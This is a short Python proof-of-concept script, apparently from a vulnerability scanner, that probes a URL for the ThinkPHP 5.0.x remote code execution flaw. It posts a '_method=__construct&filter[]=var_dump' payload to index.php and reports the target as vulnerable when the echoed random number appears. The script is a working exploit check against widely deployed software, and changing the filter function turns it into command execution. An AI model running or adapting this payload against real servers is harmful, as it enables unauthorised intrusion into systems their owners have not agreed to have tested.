import requests
import random


def poc(url):
    timeout = 5
    proxies = {'http': '127.0.0.1:9999'}
    random_num = ''.join(str(i) for i in random.sample(range(0, 9), 5))
    check_key = 'string(5) "%s"' % random_num
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    poc_data = "s=%s&_method=__construct&method&filter[]=var_dump" % random_num
    exp = "%s/index.php?s=index/index/index" % url
    try:
        req = requests.post(exp, data=poc_data, timeout=timeout, headers=headers)
        if req.status_code == 200 or req.status_code == 500:

            if check_key in req.text:
                result = "目标存在 ThinkPHP 5.0.*(Below 5.0.10) RCE, check url: %s PoC: %s" % (url, poc_data)
                return result
    except:
        pass

